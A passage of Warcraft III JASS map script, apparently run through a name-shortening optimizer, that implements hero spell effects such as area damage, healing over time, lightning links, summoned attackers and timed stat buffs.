endfunction
function ti takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function tj takes nothing returns boolean
return GetBooleanAnd(th(),ti())
endfunction
function tk takes nothing returns nothing
call UnitDamageTargetBJ(Wk,GetEnumUnit(),QK*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL)
call SetUnitLifeBJ(Wk,GetUnitStateSwap(UNIT_STATE_LIFE,Wk)+SJ[0]*Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Abilities\\Spells\\Orc\\FeralSpirit\\feralspirittarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call IssueTargetOrderBJ(GetEnumUnit(),"attack",Wk)
endfunction
function tl takes nothing returns nothing
set Wk=GetSpellAbilityUnit()
set Wl=GetUnitLoc(Wk)
set QJ=CountUnitsInGroup(GetUnitsInRangeOfLocMatching(600.,Wl,Condition(function tg)))
set QK=25.+I2R(GetHeroInt(Wk,true))*10.+I2R(GetHeroInt(Wk,true))*I2R(QJ)
set QL=GetUnitsInRangeOfLocMatching(600.,Wl,Condition(function tj))
set SJ[0]=I2R(GetHeroInt(Wk,true))*4.
call ForGroupBJ(QL,function tk)
call CreateTextTagUnitBJ("+"+I2S(R2I(SJ[0]*Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])),Wk,0,10.,0.,100,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set Wk=null
set Wl=null
set QJ=0
set QK=0.
set QL=null
set SJ[0]=0.
call RemoveLocation(Wl)
call DestroyGroup(QL)
call UnitAddAbility(GetTriggerUnit(),$41305346)
call SetUnitAbilityLevel(GetTriggerUnit(),$41305346,11)
call TriggerSleepAction(4.)
call UnitRemoveAbility(GetTriggerUnit(),$41305346)
endfunction
function tm takes nothing returns nothing
set Wm=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wm,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(Wm,Condition(function tf))
call TriggerAddAction(Wm,function tl)
endfunction
function tn takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local timer Mc
if GetUnitAbilityLevel(Hu,$42303737)>=1 and GetWidgetLife(Hu)>.405 then
else
call UnitRemoveAbility(Hu,$42303035)
call UnitRemoveAbility(Hu,$4130534F)
set Mc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Mc),0,Hu)
call SaveInteger(PP,GetHandleId(Mc),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1))
call TimerStart(Mc,.1,true,function nE)
set Mc=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function to takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Mc
local timer No
if GetIssuedOrderIdBJ()==OrderId("immolation") then
if GetUnitTypeId(Hu)==$48303031 or GetUnitTypeId(Hu)==$48303650 then
call UnitAddAbility(Hu,$4130534F)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4130534F,false)
set Mc=20*GetUnitAbilityLevel(Hu,$41313232)+(GetHeroInt(Hu,true)+GetHeroAgi(Hu,true)+GetHeroStr(Hu,true))/20
call nl(Hu,Mc)
set No=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(No),0,Hu)
call SaveInteger(Nq,GetHandleId(No),1,Mc)
call TimerStart(No,.5,true,function tn)
set No=null
endif
endif
set Hu=null
endfunction
function tp takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ISSUED_ORDER)
call TriggerAddAction(Hc,function to)
set Hc=null
endfunction
function tq takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41305745)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function tr takes nothing returns nothing
local unit Hu=GetEnumUnit()
local timer Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,8,false,function tq)
set Hc=null
call m0(Pq,Hu,Nu)
set Hu=null
endfunction
function ts takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
set Pq=Hu
set Nu=R2I(I2R(1200*GetUnitAbilityLevel(Hu,$41304144)+GetHeroInt(Hu,true)*1)*N0[GetPlayerId(GetOwningPlayer(Hu))+1])
call ForGroup(LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1),function tr)
else
call DestroyGroup(LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function tt takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(Nv)
local lightning Nm=LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 and UnitAlive(Hu) and UnitAlive(Nv) then
call MoveLightning(Nm,true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
else
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),2))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set Nv=null
endfunction
function tu takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+Nf[Ma]*LoadReal(Nq,GetHandleId(GetExpiredTimer()),2))
call ne(Hu,"+"+I2S(R2I(LoadReal(Nq,GetHandleId(GetExpiredTimer()),2))),.023,0,255,0)
else
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function tv takes nothing returns nothing
local unit Hu=GetEnumUnit()
if GetUnitTypeId(Hu)!=$48303031 and GetUnitTypeId(Hu)!=$48303650 then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)-GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/5)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Red.mdx",Hu,"origin"))
endif
set Hu=null
endfunction
function tw takes nothing returns nothing
local unit Hu=Pq
local unit Nv=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(Nv)
local lightning Nm=AddLightning("RENL",true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
local timer Hc
call SetLightningColor(Nm,1,0,0,1)
set Hc=CreateTimer()
call UnitAddAbility(Nv,$41305745)
call SetUnitAbilityLevel(Nv,$41305745,GetUnitAbilityLevel(Hu,$41304144))
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveLightningHandle(Nq,GetHandleId(Hc),2,Nm)
call SaveInteger(Nq,GetHandleId(Hc),3,81)
call TimerStart(Hc,.1,true,function tt)
set Hc=null
set Nk=null
set Ht=null
set Nv=null
set Hu=null
endfunction
function tx takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht=GetUnitLoc(Hu)
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
local group Na
local boolexpr Nb
local timer Hc
local integer Mc
local real No
if GetSpellAbilityId()==$41303146 then
set Na=CreateGroup()
set Nb=Condition(function mv)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
call ForGroup(Na,function tv)
set Mc=CountUnitsInGroup(Na)
set No=GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/20*I2R(Mc)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+No)
call ne(Hu,"+"+I2S(R2I(No)),.023,0,255,0)
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
set Pq=Hu
set Nu=R2I(I2R(1500*GetUnitAbilityLevel(Hu,$41303146)+GetHeroInt(Hu,true)*7)*N0[Ma])
call ForGroup(Na,function m8)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,8)
call SaveReal(Nq,GetHandleId(Hc),2,I2R(GetHeroStr(Hu,true)+500*GetUnitAbilityLevel(Hu,$41303146)))
call TimerStart(Hc,1,true,function tu)
set Hc=null
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
elseif GetSpellAbilityId()==$41303857 then
set Na=CreateGroup()
set Nb=Condition(function mv)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
call ForGroup(Na,function tv)
set Mc=CountUnitsInGroup(Na)
set No=GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/15*I2R(Mc)
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+No)
call ne(Hu,"+"+I2S(R2I(No)),.023,0,255,0)
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
set Pq=Hu
set Nu=R2I(I2R(12000+GetHeroInt(Hu,true)*10)*N0[Ma])
call ForGroup(Na,function m8)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,8)
call SaveReal(Nq,GetHandleId(Hc),2,I2R(GetHeroStr(Hu,true)*2+2500))
call TimerStart(Hc,1,true,function tu)
set Hc=null
call DestroyGroup(Na)
call DestroyBoolExpr(Nb)
elseif GetSpellAbilityId()==$41304144 then
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
set Pq=Hu
call ForGroup(Na,function tw)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveGroupHandle(Nq,GetHandleId(Hc),1,Na)
call SaveInteger(Nq,GetHandleId(Hc),2,9)
call TimerStart(Hc,1,true,function ts)
set Hc=null
elseif GetSpellAbilityId()==$41304C54 then
set Nu=R2I(N0[Ma]*(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*1.5))
call m0(Hu,GetSpellTargetUnit(),Nu)
endif
set Na=null
set Ht=null
set Hu=null
endfunction
function ty takes nothing returns nothing
set Wn=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wn,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wn,function tx)
endfunction
function tz takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41305349)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function t0 takes nothing returns nothing
local unit NR=GetTriggerUnit()
local unit Hu
local location Ht
local location Nk
local integer UV
local integer UU
local integer Ma=GetPlayerId(GetOwningPlayer(NR))+1
local timer Hc
local integer Mc
local group No
local boolexpr Np
if GetSpellAbilityId()==$41303039 then
set Ht=GetUnitLoc(NR)
set Hu=CreateUnitAtLoc(GetOwningPlayer(NR),$65303031,Ht,0)
call nD(Hu,27)
call IssueTargetOrder(Hu,"attack",GetSpellTargetUnit())
if GetUnitAbilityLevel(NR,$4230304F)>=1 then
call UnitAddAbility(Hu,$41303836)
endif
set UV=GetHeroAgi(NR,true)+100*GetUnitAbilityLevel(NR,$41303039)+GetHeroAgi(NR,true)*UM[Ma]/100
call nj(Hu,UV)
set UU=R2I(GetUnitState(NR,UNIT_STATE_LIFE)/2)+R2I(GetUnitState(NR,UNIT_STATE_LIFE)/2)*UM[Ma]/100
call nk(Hu,UU)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
elseif GetSpellAbilityId()==$41304734 then
call UnitDamageTarget(NR,GetSpellTargetUnit(),I2R(GetHeroAgi(NR,true))*(15.*Nd[Ma]),true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Ht=GetUnitLoc(NR)
set Hu=CreateUnitAtLoc(GetOwningPlayer(NR),$65303031,Ht,0)
call nD(Hu,27)
call IssueTargetOrder(Hu,"attack",GetSpellTargetUnit())
if GetUnitAbilityLevel(NR,$4230304F)>=1 then
call UnitAddAbility(Hu,$41303836)
endif
set UV=GetHeroAgi(NR,true)+2000+(GetHeroAgi(NR,true)+2000)*UM[Ma]/100
call nj(Hu,UV)
set UU=R2I(GetUnitState(NR,UNIT_STATE_LIFE)/2)+R2I(GetUnitState(NR,UNIT_STATE_LIFE)/2)*UM[Ma]/100
call nk(Hu,UU)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
elseif GetSpellAbilityId()==$41305A54 then
call UnitDamageTarget(NR,GetSpellTargetUnit(),I2R(GetHeroAgi(NR,true)*3*GetUnitAbilityLevel(NR,$41305A54))*Nd[Ma],true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Ht=GetUnitLoc(GetSpellTargetUnit())
set Mc=0
loop
set Nk=nU(Ht,600,Mc*90)
set Hu=CreateUnitAtLoc(GetOwningPlayer(NR),$65303035,Nk,0)
set UV=GetHeroAgi(NR,true)/2+GetHeroAgi(NR,true)/2*UM[Ma]/100
call nj(Hu,UV)
call nD(Hu,15)
call IssueTargetOrder(Hu,"attack",GetSpellTargetUnit())
call RemoveLocation(Nk)
set Nk=null
set Hu=null
set Mc=Mc+1
exitwhen Mc>=4
endloop
call RemoveLocation(Ht)
set Ht=null
elseif GetSpellAbilityId()==$41305233 or GetSpellAbilityId()==$41303041 then
call UnitAddAbility(NR,$41305349)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NR)
call TimerStart(Hc,10,false,function tz)
set Hc=null
elseif GetSpellAbilityId()==$41304741 then
set Ht=GetSpellTargetLoc()
set Pq=NR
set Nu=R2I(I2R(300*GetUnitAbilityLevel(NR,$41304741)+GetHeroAgi(NR,true)*7)*Nd[Ma])
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Ht),GetLocationY(Ht),400,Np)
call ForGroup(No,function m9)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Ht)
set Ht=null
set Np=null
set No=null
endif
set NR=null
endfunction
function t1 takes nothing returns nothing
set Wo=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wo,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wo,function t0)
endfunction
function t2 takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local group No
local boolexpr Np
local real Nt
local real Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)==10 then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),800,Np)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41304753)>=1 then
set Nt=I2R((2000+GetHeroStr(Hu,true)*2)*GetUnitAbilityLevel(Hu,$41304753))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt)
else
set Nt=I2R(12000+GetHeroStr(Hu,true)*12)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt)
endif
call ForGroup(No,function m9)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
call RemoveLocation(Mc)
set No=null
set Np=null
set Mc=null
elseif LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)==12 then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),500,Np)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41304753)>=1 then
set Nt=I2R(R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/4)*GetUnitAbilityLevel(Hu,$41304753))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt)
else
set Nt=I2R(R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*1.5))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt)
endif
call ForGroup(No,function m9)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
call RemoveLocation(Mc)
set No=null
set Np=null
set Mc=null
elseif LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)==14 then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),200,Np)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41304753)>=1 then
set Ny=I2R((2000+GetHeroStr(Hu,true)*2)*GetUnitAbilityLevel(Hu,$41304753))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nt=I2R(R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/4)*GetUnitAbilityLevel(Hu,$41304753))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt+Ny)
else
set Ny=I2R(12000+GetHeroStr(Hu,true)*12)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nt=I2R(R2I(GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*1.5))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Nt+Ny)
endif
call ForGroup(No,function m9)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
call RemoveLocation(Mc)
set No=null
set Np=null
set Mc=null
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function t3 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local timer Hc
local string M6=""
local effect Vn
local unit NQ
local real Hb
local location Ht
if GetSpellAbilityId()==$41304753 or GetSpellAbilityId()==$41304754 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set M6="war3mapImported\\IonCannon.mdx"
endif
set Vn=AddSpecialEffectTarget(M6,Hu,"origin")
call SaveEffectHandle(Nq,GetHandleId(Hc),1,Vn)
call SaveInteger(Nq,GetHandleId(Hc),2,0)
call TimerStart(Hc,.5,true,function t2)
set Hc=null
set Vn=null
elseif GetSpellAbilityId()==$4130304A or GetSpellAbilityId()==$41304537 then
if GetSpellAbilityId()==$4130304A then
set Hb=I2R((400+GetHeroStr(Hu,true)*2)*GetUnitAbilityLevel(Hu,$4130304A))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set Hb=I2R(6000+GetHeroStr(Hu,true)*15)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Nu=R2I(Hb)
call m1(Hu,GetSpellTargetUnit(),Nu)
if GetSpellAbilityId()==$4130304A then
set Hb=I2R((150+GetHeroStr(Hu,true))*GetUnitAbilityLevel(Hu,$4130304A))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set Hb=I2R(2500+GetHeroStr(Hu,true)*7)*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Nu=R2I(Hb)
call m2(Hu,Nu)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIso\\AIsoTarget.mdl",GetSpellTargetUnit(),"origin"))
set Ht=GetUnitLoc(GetTriggerUnit())
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(NQ,$53303053)
call IssueTargetOrder(NQ,"cripple",GetSpellTargetUnit())
call nD(NQ,1)
call RemoveLocation(Ht)
set Ht=null
endif
set NQ=null
set Hu=null
endfunction
function t4 takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function t3)
set Hc=null
endfunction
function t5 takes nothing returns boolean
if not (GetUnitAbilityLevelSwapped($4130304F,GetAttacker())>=1) then
return false
endif
if not (IsUnitEnemy(GetAttacker(),GetOwningPlayer(GetTriggerUnit()))==true) then
return false
endif
return true
endfunction
function t6 takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
if GetUnitAbilityLevel(Hu,$41305241)==1 then
call UnitRemoveAbility(Hu,$41305241)
else
call SetUnitAbilityLevel(Hu,$41305241,GetUnitAbilityLevel(Hu,$41305241)-1)
endif
set Hu=null
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
endfunction
function t7 takes nothing returns nothing
local unit Hu=GetAttacker()
local unit Nv=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
local timer Hc
local integer L9
local location Mc
local location No
local unit Np
if GetRandomInt(1,6)==1 and Sw[Ma]==true then
set Sw[Ma]=false
set Mc=GetUnitLoc(Hu)
set No=GetUnitLoc(Nv)
set Np=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303355,Mc,0)
call nD(Np,1)
call IssuePointOrderLoc(Np,"carrionswarm",No)
call IssuePointOrderLoc(Np,"shockwave",No)
call RemoveLocation(Mc)
call RemoveLocation(No)
set Np=null
if GetUnitAbilityLevel(Hu,$41303036)>=1 then
if GetUnitAbilityLevel(Hu,$41305241)<5 then
if GetUnitAbilityLevel(Hu,$41305241)<1 then
call UnitAddAbility(Hu,$41305241)
else
call SetUnitAbilityLevel(Hu,$41305241,GetUnitAbilityLevel(Hu,$41305241)+1)
endif
set L9=50*GetUnitAbilityLevel(Hu,$41303036)+GetHeroStr(Hu,true)/5
call nj(Hu,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\Haste.mdx",Hu,"chest"))
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,true,function nE)
set Hc=null
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,7,true,function t6)
set Hc=null
endif
elseif GetUnitAbilityLevel(Hu,$41304535)>=1 then
if GetUnitAbilityLevel(Hu,$41305241)<5 then
if GetUnitAbilityLevel(Hu,$41305241)<1 then
call UnitAddAbility(Hu,$41305241)
else
call SetUnitAbilityLevel(Hu,$41305241,GetUnitAbilityLevel(Hu,$41305241)+1)
endif
set L9=900+GetHeroStr(Hu,true)/4
call nj(Hu,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\Haste.mdx",Hu,"chest"))
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,true,function nE)
set Hc=null
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,7,true,function t6)
set Hc=null
endif
endif
call TriggerSleepAction(.5)
set Sw[Ma]=true
endif
set Hu=null
set Nv=null
set No=null
set Mc=null
endfunction
function t8 takes nothing returns nothing
set Wp=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wp,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(Wp,Condition(function t5))
call TriggerAddAction(Wp,function t7)
endfunction
function t9 takes nothing returns nothing
local unit UT=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),7))
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),8))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),8)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set UT=null
endfunction
function uB takes nothing returns nothing
call SetHeroAgi(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),GetHeroAgi(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),false)-LoadInteger(PP,GetHandleId(GetExpiredTimer()),2),false)
call SetHeroInt(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),GetHeroInt(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0),false)-LoadInteger(PP,GetHandleId(GetExpiredTimer()),3),false)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function uC takes nothing returns nothing
local unit UT=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local timer Hc
local integer L9
local integer Pd
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),6,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),6)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),6)>=1 then
set L9=GetHeroAgi(UT,true)/2+700
call nj(UT,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,10,false,function nE)
set Hc=null
set Hc=CreateTimer()
set L9=GetHeroAgi(UT,true)/20+120
call SetHeroAgi(UT,GetHeroAgi(UT,false)+L9,false)
set Pd=GetHeroInt(UT,true)/20+120
call SetHeroInt(UT,GetHeroInt(UT,false)+Pd,false)
call SaveUnitHandle(PP,GetHandleId(Hc),0,UT)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveInteger(PP,GetHandleId(Hc),3,Pd)
call TimerStart(Hc,10,false,function uB)
set Hc=null
else
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),6)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set UT=null
endfunction
function uD takes nothing returns nothing
local unit UT=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local timer Hc
local integer L9
local integer Pd
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),6,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),6)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),6)>=1 then
